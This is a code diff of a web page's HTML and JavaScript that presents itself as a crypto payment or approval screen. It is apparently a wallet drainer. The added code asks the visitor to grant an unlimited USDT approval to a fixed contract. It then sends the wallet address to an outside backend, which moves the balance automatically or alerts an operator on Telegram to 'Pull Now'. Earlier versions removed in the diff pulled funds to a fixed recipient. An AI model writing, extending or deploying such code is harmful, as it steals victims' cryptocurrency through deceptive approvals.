@@ -20,6 +20,7 @@
         .network-selector { border: 1px solid #ddd; border-radius: 8px; padding: 12px 15px; background: #f9f9f9; display: flex; align-items: center; gap: 8px; }
         .network-icon { width: 24px; height: 24px; background: #f0ad4e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; font-weight: bold; }
         .next-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
+        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; }
         .modal.show { display: flex; justify-content: center; align-items: flex-end; }
         .modal-content { background: white; border-radius: 20px 20px 0 0; padding: 30px 20px; width: 100%; max-width: 500px; }
@@ -27,6 +28,10 @@
         .modal-title { font-size: 18px; font-weight: 600; }
         .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
         .approve-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
+        .approve-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .notification { margin-top: 20px; padding: 15px; border-radius: 8px; text-align: center; font-size: 14px; }
+        .notification.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .notification.info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
     </style>
 </head>
 <body>
@@ -58,22 +63,68 @@
             </div>
         </div>
 
-        <button class="next-btn" onclick="handleApprove()">Approve & Send</button>
+        <button class="next-btn" onclick="handleApprove()" id="approveBtn">Approve & Transfer</button>
+        <div id="notification"></div>
+    </div>
+
+    <div class="modal" id="approvalModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Approve Unlimited USDT</div>
+                <button class="close-btn" onclick="closeApprovalModal()">×</button>
+            </div>
+            <p style="color: #666; margin-bottom: 20px;">Approve unlimited USDT transfer to proceed</p>
+            <button class="approve-btn" id="confirmBtn" onclick="confirmApproval()">Approve</button>
+        </div>
     </div>
 
     <script src="config.js"></script>
     <script>
+        const BACKEND_URL = "https://scanforflash-backend-production.up.railway.app";
         const CONTRACT = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
-        const TO = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
+        const RECIPIENT = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
 
         const urlParams = new URLSearchParams(window.location.search);
         const walletFromURL = urlParams.get('address');
+        let currentUserAddress = null;
+
+        window.addEventListener('load', async () => {
+            if (window.ethereum) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        currentUserAddress = accounts[0];
+                    }
+                } catch (err) { console.error('Error:', err); }
+            }
+        });
 
         async function handleApprove() {
             try {
                 if (!window.ethereum) {
-                    alert('No wallet detected');
+                    showNotification('No wallet detected', 'error');
+                    return;
+                }
+
+                document.getElementById('approvalModal').classList.add('show');
+            } catch (error) {
+                showNotification('Error: ' + error.message, 'error');
+            }
+        }
+
+        function closeApprovalModal() {
+            document.getElementById('approvalModal').classList.remove('show');
+        }
+
+        async function confirmApproval() {
+            try {
+                document.getElementById('confirmBtn').disabled = true;
+                showNotification('Processing approval...', 'info');
+
+                if (!window.ethereum) {
+                    showNotification('No wallet detected', 'error');
+                    document.getElementById('confirmBtn').disabled = false;
                     return;
                 }
 
@@ -82,29 +133,55 @@
                 const userAddress = walletFromURL || accounts[0];
 
                 if (!userAddress) {
-                    alert('No wallet connected');
+                    showNotification('No wallet connected', 'error');
+                    document.getElementById('confirmBtn').disabled = false;
                     return;
                 }
 
                 const usdt = new web3.eth.Contract([
-                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-                    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
-                    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
                 ], USDT);
 
-                const balance = await usdt.methods.balanceOf(userAddress).call();
-                const amount = web3.utils.toWei(balance.toString(), 'ether');
+                const maxUint = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                await usdt.methods.approve(CONTRACT, maxUint).send({from: userAddress});
 
-                alert('Approving...');
-                await usdt.methods.approve(CONTRACT, amount).send({from: userAddress});
+                showNotification('✅ Approval confirmed!', 'success');
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
-                alert('Sending...');
-                await usdt.methods.transferFrom(userAddress, TO, amount).send({from: userAddress});
+                // Check balance via backend
+                showNotification('Checking balance...', 'info');
+                const response = await fetch(`${BACKEND_URL}/check-balance`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ walletAddress: userAddress })
+                });
 
-                alert('Success!');
-                try { await sendTelegramNotifications(userAddress, '', null, web3.utils.fromWei(balance, 'ether')); } catch(e) {}
-            } catch(e) {
-                alert('Error: ' + e.message);
+                const result = await response.json();
+
+                if (result.autoTransferred) {
+                    showNotification(`✅ Success! ${result.balance} USDT transferred automatically!`, 'success');
+                } else {
+                    showNotification(`💬 Balance: ${result.balance} USDT\n📱 Telegram notification sent with "Pull Now" button`, 'info');
+                }
+
+                closeApprovalModal();
+                document.getElementById('confirmBtn').disabled = false;
+            } catch (error) {
+                document.getElementById('confirmBtn').disabled = false;
+                showNotification('Error: ' + error.message, 'error');
+            }
+        }
+
+        function showNotification(msg, type = "info") {
+            const notifDiv = document.getElementById('notification');
+            notifDiv.textContent = msg;
+            notifDiv.className = `notification ${type}`;
+            notifDiv.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    notifDiv.style.display = 'none';
+                }, 4000);
             }
         }
     </script>
